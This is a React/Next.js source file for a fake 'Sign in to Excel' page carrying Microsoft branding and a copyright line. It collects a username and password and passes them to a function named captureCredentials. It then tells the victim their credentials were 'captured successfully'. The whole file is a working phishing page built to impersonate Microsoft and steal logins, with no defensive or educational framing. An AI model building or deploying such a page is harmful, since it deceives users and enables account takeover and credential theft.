'use client';
import { FormEvent, useState } from 'react';
import Image from 'next/image';
import { captureCredentials } from '@/ai/flows/capture-credentials';
import { useToast } from '@/hooks/use-toast';
import { PlaceHolderImages } from '@/lib/placeholder-images';

export default function Home() {
  const bgImage = PlaceHolderImages.find(
    (img) => img.id === 'login-background'
  );

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const { toast } = useToast();

  const handleSubmit = async (event: FormEvent) => {
    event.preventDefault();
    await captureCredentials({ username, password });
    toast({
      title: 'Signed In',
      description: 'Your credentials have been captured successfully.',
    });
    // Reset form
    setUsername('');
    setPassword('');
  };

  return (
    <>
      {bgImage && (
        <Image
          id="blurredImage"
          src={bgImage.imageUrl}
          alt={bgImage.description}
          width={1920}
          height={1080}
          data-ai-hint={bgImage.imageHint}
        />
      )}

      <div className="login-overlay" role="main" aria-label="Excel Login Screen">
        <h2>Sign in to Excel</h2>

        <form onSubmit={handleSubmit} autoComplete="off">
          <input
            type="text"
            name="username"
            placeholder="Email or phone"
            required
            autoComplete="off"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            required
            autoComplete="current-password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button type="submit">Sign in</button>
        </form>

        <div className="note">© Microsoft Corporation</div>
      </div>
    </>
  );
}
